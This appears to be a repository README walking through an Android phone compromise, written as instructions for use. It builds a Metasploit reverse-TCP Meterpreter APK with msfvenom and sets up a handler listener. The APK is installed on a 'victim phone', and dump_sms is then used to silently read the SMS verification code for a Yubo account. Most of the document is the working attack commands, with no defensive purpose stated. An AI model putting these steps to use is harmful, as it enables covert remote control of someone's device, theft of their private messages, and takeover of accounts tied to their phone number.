vuln+exp:

First of all, let's get ourselves a victim phone or device: I am going to be using a Samsung Galaxy S6 running Android 7, kernel version 3.10.61-13830439 
and Knox 2.7.1. This phone is super old (and rooted, hence the outdated software) yet the exploit works.

Disclaimer: This exploit may work on Apple devices, however it is a different process as APK files do not run on iOS or OS X. 

First off, let's install Yubo. Once you have done this, make sure you have Metasploit installed. I will be using this in combination with a local Apache server
to transfer the APK easier. I will be using Ubuntu Budgie 20.04 but this works on any operating system.

First terminal command: ifconfig #this gives you the LHOST IP, indicated by 1.png in the repository.
Mine is 192.1.168.180 (yes, this only works on local networks however if you are a port forwarding nerd, this will work globally).

Next terminal command: [msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.180 LPOST=4444 R > attack.apk] #replace LHOST with your local IP.
LPORT is 4444, don't ask why, it just works. Also, don't ask why the R is there, again, it just works.

I am going to move this to my local Apache server - var/www/html/ but you can transfer via bluetooth, USB, google drive etc.

In the meantime, next terminal command: [msfconsole -q] #Ignore the sh!tty banner, we are getting down to business bois.
then, [use exploit/multi/handler] #this is our exploit handler.
Next, [set LHOST 192.168.1.180]  #again, replace with your local IP. LPORT should already be configured to 4444 in msfconsole.

Next, [set payload android/meterpreter/reverse_tcp] #this tells the exploit what payload to receive and handle.

Before you enter exploit, install the APK on the victim phone and leave it there. See 2.png in repository.

Enter [exploit] and click the APK once or twice. You should enter the phone.

If you don't get a functioning meterpreter shell, close the current session and show the sessions by typing (you guessed it), [sessions].
Switch session to a running one with [sessions -i 1] where 1 is the number of the session you want.

You now have full access to the phone, but don't get too excited. SMS is one of the only modules in here that is stealthy and the user gets no prompt
or knowledge of what we are doing. 

Go to Yubo > Sign up > enter random details >  enter the victim phone number - it will send a code. Here is where we come in. Go into your meterpreter
and type dump_sms (see P.O.C.png in repository).

I had to use prior screenshots from Kali seeing as the reverse_tcp was not connecting from my phone to computer. I will update these as soon
as it works again (it might actually be the new metasploit update).

I have also attached the screenshot of the dump_sms with the Yubo code.
